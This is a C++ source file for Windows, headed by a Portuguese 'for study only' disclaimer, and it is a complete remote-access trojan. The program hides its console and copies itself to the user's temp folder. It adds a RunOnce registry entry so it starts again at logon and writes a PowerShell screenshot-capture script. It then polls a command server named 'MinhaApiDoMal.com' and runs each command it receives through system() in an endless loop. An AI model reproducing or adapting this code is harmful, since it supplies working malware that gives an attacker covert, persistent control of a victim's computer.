/*

Este programa foi criado com a finalidade de estudo somente.
Seu mau uso não é de minha responsabilidade.

*/
#include <winsock2.h>
#include <Lmcons.h>
#include <iostream>
#include <dirent.h>
#include <fstream>
using namespace std;
#pragma comment(lib,"libws2_32.a")
void MalwareRun();
string HttpGet(string url,string urlAction)
{

  WSADATA wsaData;
  SOCKET Socket;
  SOCKADDR_IN SockAddr;
  int lineCount=0;
  int rowCount=0;
  struct hostent *host;
  locale local;
  char buffer[10000];
  int i = 0 ;
  int nDataLength;
  string website_HTML;
  string get_http;
  
  if(urlAction == " ")
  {
    get_http = "GET HTTP/1.1\r\nHost: " + url + "\r\nConnection: close\r\n\r\n";
  }
  else
  {
    get_http = "GET "+ urlAction +" HTTP/1.1\r\nHost: " + url + "\r\nConnection: close\r\n\r\n";
  }
  
      if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
      {
          return "error";
      }
	  
      Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
      host = gethostbyname(url.c_str());

      SockAddr.sin_port=htons(80);
      SockAddr.sin_family=AF_INET;
      SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

      if(connect(Socket,(SOCKADDR*)(&SockAddr),sizeof(SockAddr)) != 0)
      {
          return "error";
      }

      send(Socket,get_http.c_str(), strlen(get_http.c_str()),0 );

      while ((nDataLength = recv(Socket,buffer,10000,0)) > 0){
          int i = 0;
          while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r'){

              website_HTML+=buffer[i];
              i += 1;
          }
      }

      closesocket(Socket);
      WSACleanup();
      return website_HTML;
}
string DeserializeJson(string parameter,string htmlResponse)
{
  int initParameter;
  string parameterDeserialize;

  int htmlResponseLenght = htmlResponse.length();
  char char_arrayHtmlResponse[htmlResponseLenght + 1];
  strcpy(char_arrayHtmlResponse, htmlResponse.c_str());

  int parameterLenght = parameter.length();
  char char_arrayParameter[parameterLenght + 1];
  strcpy(char_arrayParameter, parameter.c_str());

    for (int i = 0; i < htmlResponseLenght; i++)
    {
      if(char_arrayHtmlResponse[i] == char_arrayParameter[0]
        && char_arrayHtmlResponse[i+1] == char_arrayParameter[1]
        && char_arrayHtmlResponse[i-1] == '"')
     {
       initParameter = i+parameterLenght+3;
       if(char_arrayHtmlResponse[initParameter] == ' ')
       {
         initParameter = i+parameterLenght+4;
       }
       while(char_arrayHtmlResponse[initParameter] != '"')
       {
         parameterDeserialize += char_arrayHtmlResponse[initParameter];
         initParameter++;
       }
       break;
     }
   }
 return parameterDeserialize;
}
void Malware()
{
  string url = "MinhaApiDoMal.com";
  string urlTokenAction = "/generatetoken.php";

  string apiToken = DeserializeJson("token",HttpGet(url,urlTokenAction));
  string urlActionCommand = ("/getcommand.php?token="+apiToken);

  while(true)
  {
    try
    {
      string command = DeserializeJson("commands",HttpGet(url,urlActionCommand));
      string timeStr = DeserializeJson("time",HttpGet(url,urlActionCommand));
      if(command != "error" && timeStr != "error")
      {
        int time = stoi(timeStr);
        system(command.c_str());
        Sleep(time);
      }
    }
    catch (exception ex)
    {
      continue;
    }
  }
}
void CreatePrintScreenPS1(string output)
{
  ofstream file;
  string scriptPS1;

  file.open(output+"PrintScreen.ps1");

  scriptPS1 += "Add-Type -AssemblyName System.Windows.Forms,System.Drawing\n";
  scriptPS1 += "$screens = [Windows.Forms.Screen]::AllScreens\n";
  scriptPS1 += "$top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum\n";
  scriptPS1 += "$left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum\n";
  scriptPS1 += "$width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum\n";
  scriptPS1 += "$height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum\n";
  scriptPS1 += "$bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)\n";
  scriptPS1 += "$bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)\n";
  scriptPS1 += "$graphics = [Drawing.Graphics]::FromImage($bmp)\n";
  scriptPS1 += "$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)\n";
  scriptPS1 += "$bmp.Save(\"$env:USERPROFILE\\image.png\")\n";
  scriptPS1 += "$graphics.Dispose()\n";
  scriptPS1 += "$bmp.Dispose()";

  file << scriptPS1 << endl;
  file.close();
}
string current_working_directory()
{
  char* cwd = _getcwd( 0, 0 ) ;
  string working_directory(cwd) ;
  free(cwd) ;
  return working_directory ;
}
void InitConfig(string programName)
{
  HWND window;
  AllocConsole();
  window = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(window,0);
  char username[UNLEN+1];
  DWORD username_len = UNLEN+1;
  GetUserName(username, &username_len);
  string programNameFinal = "mainFinal.exe";
  string pathUsers = "C:\\Users\\";
  string pathTarget = "\\appdata\\local\\temp\\";
  string input = current_working_directory()+"\\"+programName;
  string output = pathUsers+username+pathTarget;
  CopyFile(input.c_str(),(output+programNameFinal).c_str(), TRUE);
  string commandPowerShell = "powershell New-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce -name Main -Value "+output+programNameFinal+" -force";
  system(commandPowerShell.c_str());
  if(programName != programNameFinal)
  {
    CreatePrintScreenPS1(output);
  }
}
int main(int argc,char *argv[])
{
    InitConfig(argv[0]);
    Malware();
    return 0;
}
